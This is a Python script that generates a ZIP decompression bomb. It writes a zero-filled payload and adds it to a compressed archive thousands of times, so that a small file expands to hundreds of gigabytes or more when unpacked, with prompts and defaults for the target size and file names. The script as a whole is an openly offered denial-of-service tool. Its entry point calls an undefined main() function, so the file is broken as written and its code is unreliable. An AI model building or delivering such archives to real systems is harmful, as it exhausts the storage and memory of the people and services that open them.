import zipfile
import os
import sys

UNITS = {
    "B": 1,
    "KB": 1 << 10,
    "MB": 1 << 20,
    "GB": 1 << 30,
    "TB": 1 << 40,
    "PB": 1 << 50,
    "EB": 1 << 60,
    "ZB": 1 << 70,
    "YB": 1 << 80,
}

def progress_bar(iteration, total, bar_length=50):
    progress = (iteration / total)
    percentage = int(progress * 100)
    arrow = '#' * int(round(progress * bar_length))
    spaces = ' ' * (bar_length - len(arrow))
    sys.stdout.write(f"\r[{arrow}{spaces}] {percentage}%")
    sys.stdout.flush()

def get_bytes(amount_str):
    try:
        value, unit = amount_str.strip().upper().split()
        return int(float(value) * UNITS[unit])
    except:
        raise ValueError("Format: <number> <unit>, e.g., 1 PB or 500 GB")

def build_zip_bomb(
    target_input=None,
    payload_input=None,
    zip_name=None,
    folder_name=None,
    verbose=True,
    show_progress=True
):
    target_input = target_input or input("Bomb decompressed size: ") or "500 GB"
    payload_input = payload_input or input("Payload file size: ") or "1 MB"
    zip_name = zip_name or input("Output zip name: ") or "bomb.zip"
    folder_name = folder_name or input("Bomb directory name: ") or "bomb-dir"

    PAYLOAD_NAME = "payload.txt"
    DECOMPRESSED_TOTAL = get_bytes(target_input)
    PAYLOAD_SIZE = get_bytes(payload_input)
    REPEATS = DECOMPRESSED_TOTAL // PAYLOAD_SIZE

    if verbose:
        print(f"\n  Creating ZIP bomb:\n")
        print(f"    Payload size:         {PAYLOAD_SIZE} bytes")
        print(f"    Total uncompressed:   {DECOMPRESSED_TOTAL} bytes")
        print(f"    File count:           {REPEATS}")
        print(f"    Output:               {zip_name}\n")

    with open(PAYLOAD_NAME, "wb") as f:
        f.write(b'\0' * PAYLOAD_SIZE)

    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for i in range(REPEATS):
            arcname = f"{folder_name}/{i}.txt"
            zf.write(PAYLOAD_NAME, arcname)
            if show_progress:
                progress_bar(i + 1, REPEATS)

    os.remove(PAYLOAD_NAME)

    if verbose:
        print(f"\n\nCreated zip bomb: {zip_name}")

if __name__ == "__main__":
    main()
